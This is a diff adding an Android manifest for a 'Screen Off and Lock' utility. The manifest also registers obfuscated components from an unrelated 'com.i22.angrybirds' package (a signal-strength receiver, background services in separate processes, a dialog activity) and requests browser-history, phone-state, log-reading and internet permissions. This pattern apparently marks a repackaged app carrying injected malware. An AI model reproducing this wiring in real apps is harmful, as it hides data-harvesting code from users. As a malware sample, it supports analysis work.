@@ -1,0 +1,55 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="internalOnly" package="com.katecca.screenofflock">
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:excludeFromRecents="true" android:label="@string/app_name" android:name=".MainHelper" android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+                <action android:name="android.intent.action.SEARCH_LONG_PRESS"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:label="@string/app_name" android:name=".Main" android:taskAffinity="com.katecca.screenofflock.Main" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:icon="@drawable/icon_setting" android:label="@string/app_name_setting" android:name=".Setting" android:taskAffinity="com.katecca.screenofflock.Setting">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+                <category android:name="android.intent.category.INFO"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/app_name" android:name=".CreateNotification" android:theme="@style/Theme.Transparent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity>
+        <receiver android:label="Screen Off and Lock" android:name="Main$MyAdmin" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".StartUp" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.i22.angrybirds.aaaaaa">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.i22.angrybirds.bbbbbb" android:process=":qs"/>
+        <service android:name="com.i22.angrybirds.dddddd" android:process=":ls"/>
+        <activity android:launchMode="singleInstance" android:name="com.i22.angrybirds.cccccc" android:theme="@android:style/Theme.Dialog"/>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+</manifest>
